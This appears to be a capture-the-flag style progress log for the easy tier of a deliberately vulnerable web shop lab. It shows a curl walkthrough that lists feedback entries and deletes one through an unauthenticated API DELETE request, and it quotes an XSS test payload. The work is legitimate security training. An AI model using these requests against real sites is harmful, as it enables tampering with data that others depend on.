# Level 2 - Easy Challenges

## Challenges

| Challenge | Description | Status |
| --- | --- | --- |
| Admin Section | Access the administration section of the store. | :heavy_minus_sign:
| Basket Access Tier 1 | View another user's shopping basket. | :heavy_minus_sign:
| Deprecated Interface | Use a deprecated B2B interface that was not properly shut down. | :heavy_minus_sign:
| Five-Star Feedback | Get rid of all 5-star customer feedback. | :white_check_mark:
| Login Admin | Log in with the administrator's user account. | :heavy_minus_sign:
| Login MC SafeSearch | Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass. | :heavy_minus_sign:
| Password Strength | Log in with the administrator's user credentials without previously changing them or applying SQL Injection. | :heavy_minus_sign:
| Security Policy | Behave like any "white-hat" should. | :heavy_minus_sign:
| Weird Crypto | Inform the shop about an algorithm or library it should definitely not use the way it does. | :heavy_minus_sign:
| XSS Tier 1.5 | Perform an XSS attack with `<script>alert('xss')</script>` on a legacy page within the application. | :heavy_minus_sign:

## Solutions

### Admin Section

> Access the administration section of the store.

* Solved? :heavy_minus_sign:
* Tools Used: Chrome, :heavy_minus_sign:

### Basket Access Tier 1

> View another user's shopping basket.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Deprecated Interface

> Use a deprecated B2B interface that was not properly shut down.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Five-Star Feedback

> Get rid of all 5-star customer feedback.

* Solved? :white_check_mark:
* Tools Used: Chrome, Chrome Inspector, curl


All I had to do for this challenge was find the feedback endpoint (which was `http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/api/Feedbacks`), and test out of few requests to it. First, I got all feedback, to see what info I could get out of it.

```
$ curl http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/api/Feedbacks -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzb21lb25lQHNvbWV3aGVyZS5pbyIsInBhc3N3b3JkIjoiOTYzNDJlMzdjNDg2MmI0ZWIyMjI3NDQwZDEyOTMyNWIiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIxMC4yNDAuMjU1LjU1IiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDgtMTIgMTk6MTA6MzguMzgxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDgtMTQgMTU6NTg6NDMuNTE1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2NTc5ODMyOCwiZXhwIjoxNTY1ODE2MzI4fQ.bQY9Q8wCDH5iC4jLG6TSrQmSlGSbsXJF1SJs0_yvra_vF-XEI3ZIlRWFCpUZxXRjHxxr3WBJyiVJ6hS4p0JSl-vwOJKzWgWsU5XrGbWunoNPpfdYtf9WLaMQV5Wa5JvisTErBMfxRLpa01ebH68fy2Bedc70TmR294eiagXx1iY" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1331  100  1331    0     0   7950      0 --:--:-- --:--:-- --:--:--  7970
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "comment": "",
      "rating": 5,
      "createdAt": "2019-08-12T18:38:22.182Z",
      "updatedAt": "2019-08-12T18:38:22.182Z",
      "UserId": 1
    },
    {
      "id": 2,
      "comment": "Great shop! Awesome service!",
      "rating": 4,
      "createdAt": "2019-08-12T18:38:22.320Z",
      "updatedAt": "2019-08-12T18:38:22.320Z",
      "UserId": 2
    },
    {
      "id": 3,
      "comment": "Nothing useful available here!",
      "rating": 1,
      "createdAt": "2019-08-12T18:38:22.460Z",
      "updatedAt": "2019-08-12T18:38:22.460Z",
      "UserId": 3
    },
    {
      "id": 4,
      "comment": "Incompetent customer support! Can't even upload photo of broken purchase!<br /><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em>",
      "rating": 2,
      "createdAt": "2019-08-12T18:38:37.060Z",
      "updatedAt": "2019-08-12T18:38:37.060Z",
      "UserId": null
    },
    {
      "id": 5,
      "comment": "This is <b>the</b> store for awesome stuff of all kinds!",
      "rating": 4,
      "createdAt": "2019-08-12T18:38:37.061Z",
      "updatedAt": "2019-08-12T18:38:37.061Z",
      "UserId": null
    },
    {
      "id": 6,
      "comment": "Never gonna buy anywhere else from now on! Thanks for the great service!",
      "rating": 4,
      "createdAt": "2019-08-12T18:38:37.061Z",
      "updatedAt": "2019-08-12T18:38:37.061Z",
      "UserId": null
    },
    {
      "id": 7,
      "comment": "Keep up the good work!",
      "rating": 3,
      "createdAt": "2019-08-12T18:38:37.061Z",
      "updatedAt": "2019-08-12T18:38:37.061Z",
      "UserId": null
    }
  ]
}
```

The nice thing about REST-based APIs is that its pretty easy to assume the format to get, modify, or delete data. So, using the ID, I made a HTTP delete request to `http://vanessa-owasp-juice.centralus.azurecontainer.io:3000/api/Feedbacks/1`, and got back the following:

{"status":"success","data":{}}

Looks like they don't do any authorization checks when they get a delete request. And when I logged back into the scoreboard, I found this waiting for me.

<img src="images/2-feedback-solved.png">

Solved!

*Side note: I also noticed that, in the feedback comment for feedback ID `4`, it looks like there is HTML being returned from the API. Might be useful in a later challenge!*

### Login Admin

> Log in with the administrator's user account.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Login MC SafeSearch

> Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Password Strength

> Log in with the administrator's user credentials without previously changing them or applying SQL Injection.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Security Policy

> Behave like any "white-hat" should.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Weird Crypto

> Inform the shop about an algorithm or library it should definitely not use the way it does.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### XSS Tier 1.5

> Perform an XSS attack with `<script>alert('xss')</script>` on a legacy page within the application.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign: